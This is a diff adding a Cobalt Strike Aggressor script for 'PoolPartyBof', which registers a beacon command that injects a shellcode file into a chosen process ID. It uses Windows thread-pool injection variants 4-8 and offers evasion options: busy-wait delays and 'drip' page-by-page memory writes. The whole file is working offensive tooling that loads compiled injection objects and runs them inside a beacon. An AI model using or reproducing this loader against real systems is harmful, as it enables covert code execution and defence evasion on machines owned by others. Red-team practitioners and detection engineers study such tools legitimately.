@@ -1,0 +1,160 @@
+# PoolPartyBof — Windows thread-pool injection BOF (variants 4-8)
+# Author: Udayveer Singh (@an0nud4y)
+#   https://github.com/An0nUD4Y
+#   https://x.com/m4lici0u5
+
+beacon_command_register (
+    "PoolPartyBof",
+    "Thread-pool injection, variants 4-8",
+    "Author: @an0nud4y\n\n" .
+    "PoolPartyBof <pid> <shellcode_file> <variant> [delay_sec] [drip [drip_ms]]\n\n" .
+    "x64 beacon and x64 target only. WOW64 targets and this beacon PID are refused.\n" .
+    "The target must already have a Windows thread pool.\n" .
+    "Shellcode is allocated RW, written, then protected RX.\n" .
+    "delay_sec busy-waits between major API steps (not Sleep) and blocks Beacon\n" .
+    "until the BOF returns. Cap 120 seconds per pause.\n" .
+    "Variants 4-7 duplicate FULL_TP_POOL.CompletionPort (one ReadProcessMemory).\n\n" .
+    "Variants\n" .
+    "  4  TP_IO       Temp file (delete-on-close) + overlapped write onto the\n" .
+    "                 pool IOCP. File is closed after the write.\n" .
+    "  5  TP_ALPC     Named ALPC port associated with the pool IOCP.\n" .
+    "                 Leaves a leaked anonymous ALPC port in this beacon.\n" .
+    "  6  TP_JOB      Unnamed job; assigns this beacon to the job so Windows\n" .
+    "                 posts a packet. Beacon stays in the job; job handle leaks.\n" .
+    "  7  TP_DIRECT   Writes a remote TP_DIRECT and posts it with ZwSetIoCompletion\n" .
+    "                 on the pool IOCP. No temp file, named object, or job.\n" .
+    "  8  TP_TIMER    Worker factory + IRTimer. Replaces pool timer-queue roots.\n" .
+    "                 Can orphan existing pool timers. Does not use an IOCP.\n\n" .
+    "Optional\n" .
+    "  delay_sec   Seconds between major API steps. Default 0, cap 120.\n" .
+    "              Does not pace drip pages.\n" .
+    "  drip        Literal word drip (not 1). Reserve one region, then MEM_COMMIT\n" .
+    "              and write one page at a time, then RX. Off by default.\n" .
+    "              TP_* blobs are never dripped.\n" .
+    "  drip_ms     Milliseconds between drip pages. Default 0, cap 1000.\n" .
+    "              Allowed only after drip.\n\n" .
+    "  PoolPartyBof 2136 C:\\payloads\\sc.bin 7 30 drip 100\n" .
+    "  PoolPartyBof 2136 C:\\payloads\\sc.bin 4 2\n" .
+    "  PoolPartyBof 2136 C:\\payloads\\sc.bin 8 drip\n"
+);
+
+alias PoolPartyBof {
+    local('$barch $handle $data $args $pid $ShellcodeFile $variant $delay $drip $drip_ms $n $sc_handle $sc_data $task');
+
+    $n = size(@_);
+    if (($n < 4) || ($n > 7)) {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("PoolPartyBof"));
+        return;
+    }
+
+    $barch = barch($1);
+    if ($barch !eq 'x64') {
+        berror($1, "Only x64 Supported");
+        return;
+    }
+
+    $pid = $2;
+    $ShellcodeFile = $3;
+    $variant = $4;
+    $delay = 0;
+    $drip = 0;
+    $drip_ms = 0;
+
+    if ($n == 5) {
+        if (lc($5) eq "drip") {
+            $drip = 1;
+        }
+        else {
+            $delay = $5;
+        }
+    }
+    else if ($n == 6) {
+        if (lc($5) eq "drip") {
+            $drip = 1;
+            $drip_ms = $6;
+        }
+        else if (lc($6) eq "drip") {
+            $delay = $5;
+            $drip = 1;
+        }
+        else {
+            berror($1, "Incorrect usage!");
+            berror($1, beacon_command_detail("PoolPartyBof"));
+            return;
+        }
+    }
+    else if ($n == 7) {
+        if (lc($6) ne "drip") {
+            berror($1, "Incorrect usage!");
+            berror($1, beacon_command_detail("PoolPartyBof"));
+            return;
+        }
+        $delay = $5;
+        $drip = 1;
+        $drip_ms = $7;
+    }
+
+    if ((!-isnumber $pid) || (int($pid) <= 0)) {
+        berror($1, "Please enter a valid PID");
+        return;
+    }
+
+    if (!-exists $ShellcodeFile) {
+        berror($1, "File doesn't exist");
+        return;
+    }
+
+    if ((!-isnumber $variant) || (int($variant) < 4) || (int($variant) > 8)) {
+        berror($1, "Variant must be 4-8");
+        return;
+    }
+
+    if ((!-isnumber $delay) || (int($delay) < 0)) {
+        berror($1, "delay_sec must be a non-negative integer");
+        return;
+    }
+
+    if ($drip == 1) {
+        if ((!-isnumber $drip_ms) || (int($drip_ms) < 0)) {
+            berror($1, "drip_ms must be a non-negative integer");
+            return;
+        }
+    }
+
+    $sc_handle = openf($ShellcodeFile);
+    $sc_data = readb($sc_handle, -1);
+    closef($sc_handle);
+
+    if ($variant == 4) {
+        $handle = openf(script_resource("PoolPartyBof_V4.x64.o"));
+    }
+    else if ($variant == 5) {
+        $handle = openf(script_resource("PoolPartyBof_V5.x64.o"));
+    }
+    else if ($variant == 6) {
+        $handle = openf(script_resource("PoolPartyBof_V6.x64.o"));
+    }
+    else if ($variant == 7) {
+        $handle = openf(script_resource("PoolPartyBof_V7.x64.o"));
+    }
+    else {
+        $handle = openf(script_resource("PoolPartyBof_V8.x64.o"));
+    }
+
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if ($data eq "") {
+        berror($1, "Failed to load BOF object");
+        return;
+    }
+
+    $args = bof_pack($1, "iiiib", $pid, int($delay), int($drip), int($drip_ms), $sc_data);
+    $task = "Running BOF against $pid";
+    if ($drip == 1) {
+        $task = $task . " (drip)";
+    }
+    btask($1, $task);
+    beacon_inline_execute($1, $data, "go", $args);
+}
